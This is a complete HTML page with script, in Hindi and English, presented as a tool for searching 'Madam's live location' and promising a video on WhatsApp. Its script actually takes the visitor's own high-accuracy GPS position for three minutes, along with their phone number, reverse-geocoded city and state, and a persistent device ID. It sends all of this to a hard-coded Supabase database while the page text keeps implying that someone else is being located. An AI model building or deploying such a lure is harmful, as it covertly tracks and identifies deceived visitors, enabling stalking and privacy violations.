<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Madam Live Location Searching मैडम की लाइव लोकेशन सर्चिंग</title>

<style>
* { box-sizing: border-box; }

body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0;
    padding: 20px;
    text-align: center;
}

.container {
    max-width: 500px;
    margin: auto;
}

.phone-label {
    display: block;
    text-align: left;
    font-weight: bold;
    margin: 22px 0 8px;
}

.phone-input {
    width: 100%;
    padding: 14px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 16px;
    background: white;
}

.note {
    text-align: left;
    font-size: 14px;
    color: #444;
    line-height: 1.7;
    margin-top: 10px;
    padding: 12px;
    background: #fff;
    border-radius: 8px;
}

button {
    padding: 14px 18px;
    margin: 18px 0 8px;
    width: 100%;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    line-height: 1.5;
}

.start {
    background: #16a34a;
    color: white;
    animation: greenBlink 1s infinite;
}

.start:disabled {
    cursor: default;
    opacity: 1;
    animation: none;
}

@keyframes greenBlink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
}

#status {
    background: white;
    padding: 20px;
    margin-top: 20px;
    border-radius: 12px;
    text-align: left;
    line-height: 1.8;
    white-space: pre-line;
    overflow-wrap: anywhere;
}
</style>
</head>

<body>
<div class="container">

    <h2>📍 Madam Live Location Searching</h2>
    <h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>

    <label class="phone-label" for="phoneInput">
        📱 अपना मोबाइल नंबर डालें / Enter Your Mobile Number
    </label>

    <input
        type="tel"
        id="phoneInput"
        class="phone-input"
        inputmode="tel"
        maxlength="16"
        placeholder="Please enter your mobile number / मोबाइल नंबर डालें"
        autocomplete="tel"
    >

    <div class="note">
        📲 अपना मोबाइल नंबर डालें, तभी WhatsApp पर मैडम का वीडियो आएगा।
        <br>
        📲 Enter your mobile number to receive Madam's video on WhatsApp.
    </div>

    <button
        class="start"
        id="startButton"
        onclick="startTracking()">
        ▶ Start Location / मैडम की लोकेशन सर्च करना शुरू करें
    </button>

    <div id="status">
        📡 मैडम की लोकेशन शेयर करना अभी शुरू नहीं हुआ है।
    </div>

</div>

<script>
"use strict";

/* SUPABASE */

const SUPABASE_URL =
"https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
"sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";


/* DEVICE ID */

function getDeviceId() {
    try {
        let id = localStorage.getItem("device_id");

        if (!id) {
            if (crypto.randomUUID) {
                id = crypto.randomUUID();
            } else {
                id = "device-" +
                    Date.now() + "-" +
                    Math.random().toString(36).slice(2);
            }

            localStorage.setItem("device_id", id);
        }

        return id;
    } catch (error) {
        return "device-" +
            Date.now() + "-" +
            Math.random().toString(36).slice(2);
    }
}

const deviceId = getDeviceId();


/* TRACKING VARIABLES */

let watchId = null;
let autoStopTimeout = null;
let sessionActive = false;
let sessionNumber = 0;
let sessionPhoneNumber = null;

/* Reverse geocoding is done once per tracking session. */
let sessionLocationDetails = {
    city: "",
    district: "",
    state: ""
};


/* STATUS MESSAGE */

function showStatus(message) {
    document.getElementById("status").textContent = message;
}


/* PHONE NUMBER IS OPTIONAL */

function getPhoneNumber() {
    const input = document.getElementById("phoneInput");
    const digits = input.value.trim().replace(/\D/g, "");

    if (digits === "") {
        return { valid: true, number: null };
    }

    if (/^[6-9]\d{9}$/.test(digits)) {
        return {
            valid: true,
            number: "+91" + digits
        };
    }

    if (/^91[6-9]\d{9}$/.test(digits)) {
        return {
            valid: true,
            number: "+" + digits
        };
    }

    return { valid: false, number: null };
}


/* GET CITY, DISTRICT AND STATE */

async function getLocationDetails(latitude, longitude) {
    const result = {
        city: "",
        district: "",
        state: ""
    };

    try {
        const url =
            "https://nominatim.openstreetmap.org/reverse" +
            "?format=jsonv2" +
            "&addressdetails=1" +
            "&accept-language=en" +
            "&lat=" + encodeURIComponent(latitude) +
            "&lon=" + encodeURIComponent(longitude);

        const response = await fetch(url);

        if (!response.ok) {
            throw new Error("Reverse geocoding request failed");
        }

        const data = await response.json();
        const address = data.address || {};

        result.city =
            address.city ||
            address.town ||
            address.village ||
            address.municipality ||
            address.city_district ||
            address.suburb ||
            "";

        result.district =
            address.state_district ||
            address.district ||
            address.county ||
            "";

        result.state = address.state || "";

    } catch (error) {
        console.warn("Location details unavailable:", error);
    }

    return result;
}


/* START TRACKING */

function startTracking() {
    if (sessionActive) return;

    const button = document.getElementById("startButton");
    const phoneInput = document.getElementById("phoneInput");
    const phoneResult = getPhoneNumber();

    if (!phoneResult.valid) {
        showStatus(
            "❌ कृपया सही भारतीय मोबाइल नंबर डालें, " +
            "या बॉक्स खाली छोड़ दें।"
        );

        phoneInput.focus();
        return;
    }

    if (!navigator.geolocation) {
        showStatus("❌ इस ब्राउज़र में GPS सपोर्ट उपलब्ध नहीं है।");
        return;
    }

    sessionPhoneNumber = phoneResult.number;

    button.disabled = true;
    phoneInput.disabled = true;

    showStatus(
        "📡 GPS अनुमति और लोकेशन की प्रतीक्षा की जा रही है..."
    );

    navigator.geolocation.getCurrentPosition(
        async position => {
            if (sessionActive) return;

            sessionActive = true;
            const thisSession = ++sessionNumber;

            button.style.animation = "none";

            showStatus(
                "📍 लोकेशन सर्चिंग शुरू हो गई है।\n\n" +
                "कृपया प्रतीक्षा करें। ट्रैकिंग 3 मिनट बाद अपने आप बंद होगी।"
            );

            /*
             * Start the 3-minute timer immediately after
             * the first successful GPS position.
             */
            autoStopTimeout = setTimeout(() => {
                stopTracking(thisSession);
            }, 3 * 60 * 1000);

            /*
             * Obtain city, district and state once per session.
             * GPS coordinates continue to update separately.
             */
            sessionLocationDetails = await getLocationDetails(
                position.coords.latitude,
                position.coords.longitude
            );

            if (
                !sessionActive ||
                thisSession !== sessionNumber
            ) return;

            saveLocation(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy,
                thisSession
            );

            watchId = navigator.geolocation.watchPosition(
                currentPosition => {
                    if (
                        !sessionActive ||
                        thisSession !== sessionNumber
                    ) return;

                    saveLocation(
                        currentPosition.coords.latitude,
                        currentPosition.coords.longitude,
                        currentPosition.coords.accuracy,
                        thisSession
                    );
                },

                error => {
                    if (
                        !sessionActive ||
                        thisSession !== sessionNumber
                    ) return;

                    showStatus(
                        "⚠️ GPS अपडेट में समस्या आई।\n\n" +
                        error.message +
                        "\n\nट्रैकिंग निर्धारित समय पर अपने आप बंद होगी।"
                    );
                },

                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 30000
                }
            );
        },

        error => {
            button.disabled = false;
            phoneInput.disabled = false;
            button.style.animation = "greenBlink 1s infinite";

            showStatus(
                "❌ GPS लोकेशन प्राप्त नहीं हो सकी।\n\n" +
                "कृपया फोन की Location चालू करें और ब्राउज़र को अनुमति दें।\n\n" +
                "फिर हरे बटन को दोबारा दबाएँ।\n\n" +
                "समस्या: " + error.message
            );
        },

        {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 30000
        }
    );
}


/* SAVE LOCATION TO SUPABASE */

async function saveLocation(
    latitude,
    longitude,
    accuracy,
    thisSession
) {
    if (
        !sessionActive ||
        thisSession !== sessionNumber
    ) return;

    try {
        const response = await fetch(
            SUPABASE_URL + "/rest/v1/locations",
            {
                method: "POST",

                headers: {
                    "apikey": SUPABASE_KEY,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Prefer": "return=minimal"
                },

                body: JSON.stringify({
                    device_id: deviceId,
                    phone_number: sessionPhoneNumber,
                    latitude: latitude,
                    longitude: longitude,
                    accuracy: accuracy,
                    city: sessionLocationDetails.city || null,
                    district: sessionLocationDetails.district || null,
                    state: sessionLocationDetails.state || null
                })
            }
        );

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(errorText || "Supabase save failed");
        }

        if (
            !sessionActive ||
            thisSession !== sessionNumber
        ) return;

        showStatus(
            "📍 लोकेशन सर्चिंग जारी है।\n\n" +
            "📱 मोबाइल नंबर: " +
            (sessionPhoneNumber || "नंबर नहीं दिया गया") +
            "\n\n" +
            "✅ लोकेशन सर्वर पर सेव हो गई।\n" +
            "🎯 Accuracy: " + Number(accuracy).toFixed(1) + " m\n" +
            "🏙️ City: " + (sessionLocationDetails.city || "-") + "\n" +
            "🗺️ State: " + (sessionLocationDetails.state || "-") +
            "\n\n" +
            "⏳ ट्रैकिंग 3 मिनट बाद अपने आप बंद होगी।"
        );

    } catch (error) {
        console.error("Supabase Error:", error);

        if (
            sessionActive &&
            thisSession === sessionNumber
        ) {
            showStatus(
                "⚠️ लोकेशन सर्वर पर सेव नहीं हो पाई।\n\n" +
                "कृपया इंटरनेट, Supabase की सेटिंग और डेटाबेस कॉलम जाँचें।"
            );
        }
    }
}


/* AUTOMATIC STOP AFTER 3 MINUTES */

function stopTracking(thisSession) {
    if (
        !sessionActive ||
        thisSession !== sessionNumber
    ) return;

    sessionActive = false;

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
    }

    if (autoStopTimeout !== null) {
        clearTimeout(autoStopTimeout);
        autoStopTimeout = null;
    }

    showStatus(
        "✅ 3 मिनट पूरे हो गए हैं।\n\n" +
        "लोकेशन सर्चिंग अपने आप बंद हो गई है।\n\n" +
        "पहले से सेव लोकेशन रिकॉर्ड सुरक्षित हैं।"
    );

    const button = document.getElementById("startButton");
    const phoneInput = document.getElementById("phoneInput");

    button.disabled = false;
    phoneInput.disabled = false;
    button.style.animation = "greenBlink 1s infinite";

    sessionPhoneNumber = null;
    sessionLocationDetails = {
        city: "",
        district: "",
        state: ""
    };
}
</script>
</body>
</html>
